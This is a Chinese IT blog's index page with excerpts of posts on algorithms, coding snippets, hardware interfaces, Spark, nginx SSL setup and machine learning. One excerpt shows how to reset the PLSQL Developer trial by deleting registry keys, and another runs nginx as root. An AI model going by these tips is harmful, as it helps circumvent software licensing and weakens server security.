<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="IT学习者博客">
		<meta property="og:title" content="IT学习者博客" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbe246e603d9d378631b2bdaac973ff0/" rel="bookmark">
			排序算法对比、总结(Python代码)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上海站 | 高性能计算之GPU CUDA培训 4月13-15日 三天密集式学习 快速带你晋级 阅读全文 &gt; 正文共6126个字，27张图，预计阅读时间16分钟。
排序大的分类可以分为两种：内排序和外排序。在排序过程中，全部记录存放在内存，则称为内排序，如果排序过程中需要使用外存，则称为外排序。下面讲的排序都是属于内排序。
内排序有可以分为以下几类：
1、插入排序：直接插入排序、二分法插入排序、希尔排序。
2、选择排序：直接选择排序、堆排序。
3、交换排序：冒泡排序、快速排序。
4、归并排序
5、基数排序
对比 61520931627_.pi
冒泡排序 1.基本思想：两个数比较大小，较大的数下沉，较小的数冒起来。
2.过程：
比较相邻的两个数据，如果第二个数小，就交换位置。
从后向前两两比较，一直到比较最前两个数据。最终最小数被交换到起始的位置，这样第一个最小数的位置就排好了。
继续重复上述过程，依次将第2.3...n-1个最小数排好位置。
image
3.平均时间复杂度：O(n2)
4.优化：
针对问题：
数据的顺序排好之后，冒泡算法仍然会继续进行下一轮的比较，直到arr.length-1次，后面的比较没有意义的。
方案：
设置标志位flag，如果发生了交换flag设置为true；如果没有交换就设置为false。
这样当一轮比较结束后如果flag仍为false，即：这一轮没有发生交换，说明数据的顺序已经排好，没有必要继续进行下去。
5.Python代码实现：
@staticmethoddef bubble_sort(arr): for i in range(len(arr)): not_change = True for j in range(len(arr) - 1, i - 1, -1): if arr[j] &lt; arr[j - 1]: tmp = arr[j] arr[j] = arr[j - 1] arr[j - 1] = tmp not_change = False if not_change: break
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dbe246e603d9d378631b2bdaac973ff0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aef000d09e1fb4b3a6ffbe2843b9563d/" rel="bookmark">
			thinkpad开机引导方式变成PCI LAN选项解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：开机的引导方式变成【PCI LAN】,并且前面有一个小箭头,无法正常启动加载。在BIOS中重置调整启动顺序也无法解决。无法进入U盘启动盘
1、首先开机按F12进入BIOS,选择 APP Menu，接着选 setup，回车；
2、接着找到Security--&gt;Secure Boot选项回车
2、回车后,把Secure Boot回车改成Disabled,
3、接着按ESC返回上一级菜单,选择StartUp选项,把UEFI/Legacy Boot回车改成Both ,
把UEFI/Legacy Boot Priority改成Legacy First，把 CSM Support改成YEs，接着按F10-YES保存即可
4、接着就可以正常进入系统或U盘启动了，
转载于:https://www.cnblogs.com/weiyiming007/p/8615518.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b21175434c888eb683f76d323bd7214/" rel="bookmark">
			Android EditText 字数限制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mChatMsgEt.addTextChangedListener(new TextWatcher() { private int limit = 200; // 字数限制 private CharSequence beforeSeq; // 保存修改前的值 private int afterStart; private int afterCount; @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) { if (s.length() + (after-count) &gt; limit) { beforeSeq = s.subSequence(start, start + count); toastMsg("不能超过" + limit + "字！"); } } @Override public void onTextChanged(CharSequence s, int start, int before, int count) { if (count &gt; before &amp;&amp; s.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b21175434c888eb683f76d323bd7214/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9697aaeea4fab0a9b462b4b6f4f21ee/" rel="bookmark">
			PLSQL Developer 30天过期问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、win+R运行窗口
二、输入cmd进入命令窗口
三、命令窗口中输入 regedit
四、HKEY_CURRENT_USER\Software\Allround Automations
五、删除Allround Automations
六、HKEY_CURRENT_USER\Software\Microsoft\Security
七、删除Security
八、重新登陆PL/SQL Develope
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29f7f060c6bd15ebf9b9aec502b9bdc0/" rel="bookmark">
			LeetCode242有效的字母异位词
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目： 给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的一个字母异位词。
例如，
s = "anagram"，t = "nagaram"，返回 true
s = "rat"，t = "car"，返回 false
注意:
假定字符串只包含小写字母。
分析： 两个int型数组，sArray和tArray，来储存s和t字符串中的字符情况，a对应数组下标0，b对应数组下标1……
最后比较两个数组内容情况。
也可以用哈希表实现。原理一样。
代码： class Solution { public boolean isAnagram(String s, String t) { if (s.length() != t.length()) return false; int[] sArray = new int[26]; int[] tArray = new int[26]; for (int i = 0; i &lt; s.length(); i++) { sArray[s.charAt(i)-97] ++; tArray[t.charAt(i)-97] ++; } for (int i = 0; i &lt; 26; i++) if (sArray[i]!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/29f7f060c6bd15ebf9b9aec502b9bdc0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35306736dce1ec0a4b4e20d7651393bd/" rel="bookmark">
			JS左边列表移到到右边列表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt; &lt;HTML&gt; &lt;HEAD&gt; &lt;TITLE&gt; Select Demo &lt;/TITLE&gt; &lt;META NAME="Generator" CONTENT="EditPlus"&gt; &lt;META NAME="Author" CONTENT=""&gt; &lt;META NAME="Keywords" CONTENT=""&gt; &lt;META NAME="Description" CONTENT=""&gt; &lt;/HEAD&gt; &lt;style&gt; center { font-size:12px; color:red; font-weight:bold; } select { font-size:12px; color:green; } &lt;/style&gt; &lt;BODY&gt; &lt;span id='feedback'&gt;&lt;/span&gt; &lt;form method="post" name="myform"&gt; &lt;table border="0" width="400"&gt; &lt;tr&gt; &lt;td&gt;&lt;CENTER&gt;可选择排序方式&lt;/CENTER&gt;&lt;/td&gt; &lt;td&gt; &lt;/td&gt; &lt;td&gt;&lt;CENTER&gt;已选择排序方式&lt;/CENTER&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width="40%"&gt; &lt;select multiple name="left" id="left" size="8" style='width:200;' οndblclick="moveOption(document.getElementById('left'), document.getElementById('right'))"&gt; &lt;option value="20"&gt;测试数据一&lt;/option&gt; &lt;option value="30"&gt;测试数据二&lt;/option&gt; &lt;option value="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/35306736dce1ec0a4b4e20d7651393bd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b260186e11e469a8cf00b5013c53ae41/" rel="bookmark">
			二叉树遍历（已知前序和后序遍历，求中序遍历的可能的序列数）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目描述 Description
我们都很熟悉二叉树的前序、中序、后序遍历，在数据结构中常提出这样的问题：已知一棵二叉树的前序和中序遍历，求它的后序遍历，相应的，已知一棵二叉树的后序遍历和中序遍历序列你也能求出它的前序遍历。然而给定一棵二叉树的前序和后序，你却不能确定其中序遍历序列，考虑如下图中的几棵二叉树：
所有这些二叉树都有着相同的前序遍历和后序遍历，但中序遍历却不相同。
输入描述 Input Description
输入文件共2行，第一行表示该树的前序遍历结果，第二行表示该树的后序遍历结果。输入的字符集合为{a-z}，长度不超过26。
输出描述 Output Description
输出文件只包含一个不超过长整型的整数，表示可能的中序遍历序列的总数。
样例输入 Sample Input
abc
cba
样例输出 Sample Output
4
解题思路：
在求解这题之前得先了解一些基础知识：
前序遍历：根结点 ---&gt; 左子树 ---&gt; 右子树
中序遍历：左子树---&gt; 根结点 ---&gt; 右子树
后序遍历：左子树 ---&gt; 右子树 ---&gt; 根结点
由以上的前中后遍历顺序可以看出在已知前序遍历和后序遍历的情况下，中序遍历不是唯一确定的。而且中序遍历的不确定性是由一个节点（只有一边子树）的左右子树的不确定性决定的。例如前序遍历ab，后序遍历ba，a为根，b为子树，在中序遍历中如果b为左子树，则中序遍历为ba；如果b为右子树，则中序遍历为ab。所以当这种节点有n个时，中序遍历的可能性就有:2^n；
那么问题就转变为如果确定这种节点的数量。可以总结出一个规律，如上例。前序遍历为ab，后序遍历为ba，此时无法确定b是为左子树还是右子树，那么就产生了一个特殊节点。所以规律就是(此时a,b分别为前序遍历和后序遍历的字符串)：a[i]==b[j]时，a[i+1]==b[j-1]则产生一个特殊节点
代码如下：
#include&lt;stdio.h&gt; #include&lt;string.h&gt; #define M 30 int count=0; int power(int ans); int main() { char a[M],b[M]; int i=0,j=0; int lengthA=0,lengthB=0; gets(a); gets(b); lengthA=strlen(a),lengthB=strlen(b); for(i=0;i&lt;lengthA;i++) for(j=1;j&lt;lengthB;j++) if(a[i]==b[j]&amp;&amp;a[i+1]==b[j-1]) count++; printf("%d\n",power(count)); return 0; } int power(int ans) { int sum=1; while(--ans&gt;=0) sum*=2; return sum; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f11fa3a8f1711eef5c2724acdc9a4c1b/" rel="bookmark">
			VGA/DVI/HDMI/DP/Type-C等常用显示接口对比介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在我们的生活中，无论是电脑、电视还是投影设备等等，都离不开视频输出接口，尤其在显卡上面，通常会出现3种甚至更多的接口。很多人并不了解其中的区别，觉得只要有画面输出就可以了，其实对于很多显示器来说并非如此，今天就来和大家说一说视频接口那些事。
最古老的接口—VGA
VGA接口（Video Graphics Array）
要说 VGA 接口的历史，最早可以追溯到1987年了，蓝色的插头也是最有辨识度的一个接口。VGA 接口有3排针脚，每排5个，共有15针。VGA接口采用的是模拟信号，在早之前使用CRT显示器（俗称的大脑袋）时，使用的都是 VGA 接口，不过目前几乎已经被淘汰了，只有个别的投影设备或是一些仪器还在使用。
VGA 接口传输的是模拟信号，抗干扰能力弱，而且目前的显示器的基本都为数字信号，模拟信号要经过多次信号间的转换，会导致部分信号丢失，造成画面质量下降，这也是它被淘汰的主要原因。
显示器使用率较高的接口——DVI
DVI接口（Digital Video Interface）
随着液晶显示器的飞速发展，传统的 VGA 接口已经不能满足，DVI 接口也就此诞生，它可以实现长距离、高质量的数字信号传输，相信目前很多人的显示器都还在使用DVI接口。虽然白色的插头也很好分辨，但是具体的规格还是比较复杂的。
DVI 接口共有三种规格，分别是 DVI-I（Integrated混合），DVI-D（Digital数字）和 DVI-A（Analog模拟），其中 DVI-I 和 DVI-D 还分为“单通道”和“双通道”两种类型。
DVI-A 接口传递的仍是模拟信号，因此与 VGA 接口并没有本质的区别；DVI-I 接口同时支持模拟信号和数字信号的传输，是一个过渡性的产品；DVI-D 接口仅支持数字信号，也是目前最常见的 DVI 接口。其中，应用较多的是双通道的型号，它有着更大的带宽。
DVI 接口的比较明显的缺点就是不支持传输音频信号，并且接口的体积很大，因此也慢慢地被淘汰了。
当下比较主流的接口—HDMI
HDMI 接口（High Definition Multimedia Interface）
HDMI 相比 DVI 接口支持了音频的输出，并且有着更高的带宽，它可以算是目前最主流的视频输出接口，由于接口变得更小，也被广泛应用于电视机、显示器、笔记本电脑等设备上。HDMI 接口虽然在规范上没有 DVI 那么负载，但是却有着不同的形态。
其中我们最常见，使用最多的是 HDMI A Type，共有19针；HDMI B Type 可以看做是A类的双通道版，拥有29针，可传输双倍的数据量，但是它没用应用于任何的产品当中；HDMI C Type 和 HDMI D Type 在尺寸上进行缩小，更多应用于便携式产品中。
规格最强的接口—DP
DP接口（DisplayPort）
在目前的显示器中几乎都标配了DP接口，它可以看做是 HDMI 接口的升级版，但是内部数据的传输方式与 DVI 和 HDMI 完全不同，有着更高的带宽。得益于它良好的性能和先进的技术，DP 接口已经逐渐成为了高端显示器必不可少的接口。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f11fa3a8f1711eef5c2724acdc9a4c1b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38665e79458a07537ef5ed98c3627efc/" rel="bookmark">
			spark相关面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		spark面试问题收集 spark面试问题 1、spark中的RDD是什么，有哪些特性 RDD（Resilient Distributed Dataset）叫做分布式数据集，是Spark中最基本的数据抽象，它代表一个不可变、可分区、里面的元素可并行计算的集合。 Dataset：就是一个集合，用于存放数据的Distributed：分布式，可以并行在集群计算Resilient：表示弹性的 弹性表示 1、RDD中的数据可以存储在内存或者是磁盘2、RDD中的分区是可以改变的五大特性： A list of partitions 一个分区列表，RDD中的数据都存在一个分区列表里面A function for computing each split 作用在每一个分区中的函数A list of dependencies on other RDDs 一个RDD依赖于其他多个RDD，这个点很重要，RDD的容错机制就是依据这个特性而来的Optionally, a Partitioner for key-value RDDs (e.g. to say that the RDD is hash-partitioned) 可选的，针对于kv类型的RDD才具有这个特性，作用是决定了数据的来源以及数据处理后的去向Optionally, a list of preferred locations to compute each split on (e.g. block locations for an HDFS file) 可选项，数据本地性，数据位置最优 2、概述一下spark中的常用算子区别（map、mapPartitions、foreach、foreachPartition） map：用于遍历RDD,将函数f应用于每一个元素，返回新的RDD(transformation算子)。foreach:用于遍历RDD,将函数f应用于每一个元素，无返回值(action算子)。mapPartitions:用于遍历操作RDD中的每一个分区，返回生成一个新的RDD（transformation算子）。foreachPartition: 用于遍历操作RDD中的每一个分区。无返回值(action算子)。
总结：一般使用mapPartitions或者foreachPartition算子比map和foreach更加高效，推荐使用。
3、谈谈spark中的宽窄依赖 RDD和它依赖的父RDD（s）的关系有两种不同的类型，即窄依赖（narrow dependency）和宽依赖（wide dependency）。宽依赖：指的是多个子RDD的Partition会依赖同一个父RDD的Partition窄依赖：指的是每一个父RDD的Partition最多被子RDD的一个Partition使用。 4、spark中如何划分stage 1.Spark Application中可以因为不同的Action触发众多的job，一个Application中可以有很多的job，每个job是由一个或者多个Stage构成的，后面的Stage依赖于前面的Stage，也就是说只有前面依赖的Stage计算完毕后，后面的Stage才会运行。2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/38665e79458a07537ef5ed98c3627efc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/852d717c74629009a814c0b3c41fe512/" rel="bookmark">
			有趣的Fizzbuzz面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		话说Fizz Buzz是什么鬼？
Fizz Buzz是洋人小朋友在学除法时常玩的游戏，玩法是：从1数到100，如果遇见了3的倍数要说Fizz，5的倍数就说Buzz，如果即是3的倍数又是5的倍数就说FizzBuzz。 最后演变为一个编程面试题：写一个程序输出1到100，但是如果遇到数字为3的倍数时输出Fizz，5的倍数输出Buzz，既是3的倍数又是5的倍数输出FizzBuzz。 原题目链接：http://joelgrus.com/2016/05/23/fizz-buzz-in-tensorflow/ 翻译版：http://blog.topspeedsnail.com/archives/11010 以下为个人写的python小程序`
for i in range(1,101): if ( i%3 == 0 and i%5 ==0): print ("FizzBuzz") elif i%3==0: print("Fizz") elif (i%5==0): print("Buzz") else: print(i) 实验证明是正确的。列出部分实验结果如下： 但是如何用C++实现呢？对于我一个C++小白来说,最好的方法就是借鉴网上大拿们的code了
#include &lt;iostream&gt; using namespace std; int main(){ for(int i=1;i&lt;=100;i++){ if(i%15==0)cout&lt;&lt;"FizzBuzz"&lt;&lt;endl; else if(i%5==0)cout&lt;&lt;"Buzz"&lt;&lt;endl; else if(i%3==0)cout&lt;&lt;"Fizz"&lt;&lt;endl; else cout&lt;&lt;i&lt;&lt;endl; } return 0; } 实验结果如图所示： 以下是某位大神用TensorFlow写出来的程序，他使用两层全连接网络玩了一下，准确率还可以。
import numpy as np import tensorflow as tf def binary_encode(i, num_digits): return np.array([i &gt;&gt; d &amp; 1 for d in range(num_digits)]) def pro_data(): data_set_list=[binary_encode(i,14) for i in range(101,10001,1)] data_set=np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/852d717c74629009a814c0b3c41fe512/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6477bbbda343c737e6eb6e6bed7cd5b/" rel="bookmark">
			DS 证据理论
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DS证据理论学习笔记 参考资料：浙江大学徐从富教授 可见点击打开链接
一、经典证据理论
1、经典证据理论的主要特点：
①满足比比贝叶斯概率更弱的条件，即不必蛮子概率可加性
②具有直接表达“不确定”和“不知道”的能力
③证据理论不但允许人们将信度赋予假设空间的单个元素，而且还能赋予他的子集
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dba7d27007e34e9221c06b5daf225a22/" rel="bookmark">
			6个div块,随机颜色
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参加工作以后，基本用到的都是react，最近老大要求用h5+mui做出一款app,制作过程中发现很多原生js已经不熟悉，看来js基础忘得都差不多了，需要补习了。app中有一个要求是页面对应的几个模块每次打开都要显示不同的随机颜色。我就封装成了一个函数，有不足的地方，还希望多多指点。代码如下。
&lt;div class="giveYouColorSeeSee"&gt;1&lt;/div&gt; &lt;div class="giveYouColorSeeSee"&gt;2&lt;/div&gt; &lt;div class="giveYouColorSeeSee"&gt;3&lt;/div&gt; &lt;div class="giveYouColorSeeSee"&gt;4&lt;/div&gt; &lt;div class="giveYouColorSeeSee"&gt;5&lt;/div&gt; &lt;div class="giveYouColorSeeSee"&gt;6&lt;/div&gt; .giveYouColorSeeSee { width: 100px; height: 100px; border: 1px solid blue; display: inline-block; margin-top: 10px; margin-right: 10px; }	&lt;script&gt; var giveColor = document.getElementsByClassName('giveYouColorSeeSee'); var color = ['#578fff', '#8c9ffd', '#ff7ea2', '#ffbf43', '#74dde3', 'red']; function randomColorOn(giveColor,color){//参数1为获取的元素组，参数二为获取的颜色组 var arr2 = []; for(var i = color.length; i &gt; 0; i--) { const num = Math.floor(Math.random() * color.length); //获取随机数 arr2.push(color[num]); //把随机数添加到数组中 color.splice(num, 1); //删除原有数组的颜色 } for(var j = 0; j &lt; giveColor.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dba7d27007e34e9221c06b5daf225a22/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9f2386c4e3fab0a88e0da0ec66f72cb/" rel="bookmark">
			Transmission添加SSL访问
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0、准备工作
0.1、在App Center中安装Entware-ng
0.2、以admin用户登录SSH到NAS
0.3、申请SSL证书，可以找免费的申请一个
0.4、公网IP和域名，这个要和SSL配合起来
1、首先通过Entware-ng安装nginx
opkg update opkg upgrage opkg install nginx 2、修改配置
ngix的配置文件在/opt/etc/nginx/nginx.conf
# 先备份一下 cp /opt/etc/nginx/nginx.conf /opt/etc/nginx/nginx.conf.bak # 修改配置 vi /opt/etc/nginx/nginx.conf 主要是添加SSL的反向代理配置
# 修改用户配置 将user nobody修改为user root # 参考HTTPS server段，添加以下配置 server { listen 8091 ssl; server_name localhost; ssl_certificate /opt/etc/cert/ssl.crt; ssl_certificate_key /opt/etc/cert/ssl.key; location / { proxy_pass http://localhost:9091; } } # 注意： # 1、上面的8091为外部访问的https端口，即：https://mycloud.com:8091 # 2、将证书文件放在相应的目录下 3、重启nginx服务
# 先关闭后启动，过程中需要输入admin用户的密码 sudo ../init.d/S80nginx stop sudo ../init.d/S80nginx start 当你看到“Nginx started.”代表成功启动，去浏览器输入https://mycloud.com:8091访问试试吧。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f9f2386c4e3fab0a88e0da0ec66f72cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64efa8294eb63a3c5faade5666771da5/" rel="bookmark">
			打点系统优化HTTP请求
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为更好的理解用户，互联网公司会将用户的行为收集上来进行分析，打点系统应运而生。但互联网公司的用户数都比较多，而且每个用户的行为也很多，这样服务器收到的打点请求就非常多，QPS非常高，对web服务器的要求也会非常之高。为提升整个打点系统的性能，可以采用以下几个方式。
减少打点的次数 常规的方案是将多个行为事件合并后上传，以减少单个客户端的上报次数，这会导致一个事件触发后，事件没有及时上传，从而影响上报率。该方法是在上报率和服务器资源之间的一种折中方案。根据需要，可以根据事件的优先级，分不同的打包策略和上传策略。优先级高的行为，尽量一发生就生成包上传。优先级低的行为，可以将多个行为合并后上传，然后服务端基于统计学的原理来分析数据
使用长连接通道 使用长连接通道可以减少客户端和服务端之间的HTTP握手次数，以此减少服务器的负载，该方法适合用户使用时间长的场景。
优化NGINX和web服务器之间的连接 部分打点系统在qps高的时候丢失数据，为解决该问题，我们经常采用加服务器的方法。后面运维在nginx调整了一个参数，让nginx和下游web服务保持长连接，一下将web服务的CPU负载降了下来，提高了单台web服务的负载能力。
避免流量尖峰的出现 带宽、服务器数目等资源往往是由QPS的最高值决定的，而不是平均值决定的。为保证服务可用性，当打点的峰值在10万QPS时，系统就必须保证整个服务能撑起10万的QPS，否则服务的可用性就比较差。为了减少流量尖峰的影响，在设计系统的时候就要尽量避免。如果当时没避免，后面也可以通过观察打点服务的QPS曲线，找到QPS出现尖峰的时候，分析QPS高的原因，看是否可以想办法在业务逻辑上避免，或者在尖峰时刻给每个客户端打点加个随机的延迟，以将尖峰销平。
以上优化打点的方式是我们在工作采用的常规方案，灵活应用的话，可节约一大笔服务器费用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/836e045cc3dc55861e82dd709ef4ee30/" rel="bookmark">
			python中如何实现将数据分成训练集与测试集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		接下来，直接给出大家响应的代码，并对每一行进行标注，希望能够帮到大家。
需要用到的是库是。numpy 、sklearn。
#导入相应的库（对数据库进行切分需要用到的库是sklearn.model_selection 中的 train_test_split） import numpy as np from sklearn.model_selection import train_test_split #首先，读取.CSV文件成矩阵的形式。 my_matrix = np.loadtxt(open("xxxxxx.csv"),delimiter=",",skiprows=0) #对于矩阵而言，将矩阵倒数第一列之前的数值给了X（输入数据），将矩阵大最后一列的数值给了y（标签） X, y = my_matrix[:,:-1],my_matrix[:,-1] #利用train_test_split方法，将X,y随机划分问，训练集（X_train），训练集标签（X_test），测试卷（y_train）， 测试集标签（y_test），安训练集：测试集=7:3的 概率划分，到此步骤，可以直接对数据进行处理 X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42) #此步骤，是为了将训练集与数据集的数据分别保存为CSV文件 #np.column_stack将两个矩阵进行组合连接 train= np.column_stack((X_train,y_train)) #numpy.savetxt 将txt文件保存为。csv结尾的文件 numpy.savetxt('train_usual.csv',train, delimiter = ',') test = np.column_stack((X_test, y_test)) numpy.savetxt('test_usual.csv', test, delimiter = ',') 完整没解释的代码部分为
import numpy as np from sklearn.model_selection import train_test_split my_matrix = np.loadtxt(open("xxxxx.csv"),delimiter=",",skiprows=0) X, y = my_matrix[:,:-1],my_matrix[:,-1] X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/836e045cc3dc55861e82dd709ef4ee30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a7e039e6bb7e3ac0f64a3145edc54bb/" rel="bookmark">
			朴素贝叶斯(naive Bayes)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有点:数据较少的情况下仍然有效,可以处理多类别问题 缺点:对于输入数据准备方式比较敏感 适用数据类型:标称数据
朴素贝叶斯(Naive Bayes) 贝叶斯决策理论(Bayesian decision theory) 条件概率(conditional probability) 文本分类(document classification) 独立(independence)
朴素贝叶斯一个假设就是每个特征同等重要,这也是朴素的与意思.虽然假设上存在一些小的瑕疵,但是朴素贝叶斯的实际效果很好. p(A|B),在B发生的前提下,发生A的概率(the probability of A given B)
贝叶斯原理
假设A桶有2个白球,2个黑球.B桶有1个白球,2个黑球 P(白&amp;B)=1/7(取的球是白球且是在B桶中取的概率) P(B)=3/7(取的球是在B桶中的概率) p(白|B)=1/3(已知在B桶中取球,取得白球的概率) p(白|B)=P(白&amp;B)/P(B)
贝叶斯概率要解决的问题就是 已知在B桶中取到白球的概率,求取一个白球,是出自B桶的概率 p(B|白)=p(白|B)p(B)p(白) p ( B | 白 ) = p ( 白 | B ) p ( B ) p ( 白 ) 其中 p(白B)=p(白|B)p(B) p ( 白 B ) = p ( 白 | B ) p ( B ) P(Y|X)=P(X|Y)P(Y)P(X) P ( Y | X ) = P ( X | Y ) P ( Y ) P ( X ) P(Y,X)=P(Y|X)P(X)=P(X|Y)P(Y) P ( Y , X ) = P ( Y | X ) P ( X ) = P ( X | Y ) P ( Y ) P(Y) P ( Y ) 先验概率, P(Y/X) P ( Y / X ) 后验概率, P(Y,X) P ( Y , X ) 叫联合概率 Y属于某类,X具有某个特征 P(“属于某类”|“具有某特征”)=P(“具有某特征”|“属于某类”)P(“属于某类”)P(“具有某特征”) P ( “ 属 于 某 类 ” | “ 具 有 某 特 征 ” ) = P ( “ 具 有 某 特 征 ” | “ 属 于 某 类 ” ) P ( “ 属 于 某 类 ” ) P ( “ 具 有 某 特 征 ” ) P(“属于某类”|“具有某特征”)=在已知某样本“具有某特征”的条件下，该样本“属于某类”的概率。所以叫做『后验概率』。 P(“具有某特征”|“属于某类”)=P(“具有某特征”|“属于某类”)= 在已知某样本“属于某类”的条件下，该样本“具有某特征”的概率。 P(“属于某类”)=P(“属于某类”)=（在未知某样本具有该“具有某特征”的条件下，）该样本“属于某类”的概率。所以叫做『先验概率』。 P(“具有某特征”)=P(“具有某特征”)=(在未知某样本“属于某类”的条件下，)该样本“具有某特征”的概率。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a7e039e6bb7e3ac0f64a3145edc54bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73e6dcdb5f75235361423d439705cc40/" rel="bookmark">
			手把手教你脑电波采集及信号处理分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引自:https://zhuanlan.zhihu.com/p/34410111
关键词：EEG数字信号处理，FFT， EDF格式转换
注意：该文章旨在让一个人在没有太多基础的情况下，一步一步的了解脑电信号的采集，处理流程。由于本人非专业算法人士，其中可能有诸多错误，欢迎指正。该思路可同样适用于其他信号的分析处理。
有问题可以留言也可以发邮件eegdiy@aliyun.com。欢迎关注本账号。
分两个PART，第一个讲采集，第二个讲处理。
Part one:
脑电，心电，肌电，眼电等，都是身体上两点的电压差，和我们测电池的电压本质上没有区别。
随便在头上两个位置放两个电极，一正一负，放大uV信号（其他脑电信号特征，如频段，干扰源等感兴趣可自行百度）,测量其电势差。
但我们通常需要加一个右腿驱动电极，比如在乳突，这是为什么呢？先用专业的话：
共模输入电压会影响输入差分对的偏置点。由于输入电路固有的不匹配，偏置点的改变会引起输入失调典雅的改变，进而引起输出电压的改变。不要心里MMP，这就说人话。请看下面这张图：以心电为例，脑电原理一样。
假设共模干扰是图中的A，有用的ECG信号为B，则我们很有可能采到的是A+B,所以我们要把A抵消掉，反馈到身体上一个负A的信号。这样我们抑制了大部分的共模信号，就得到B了。
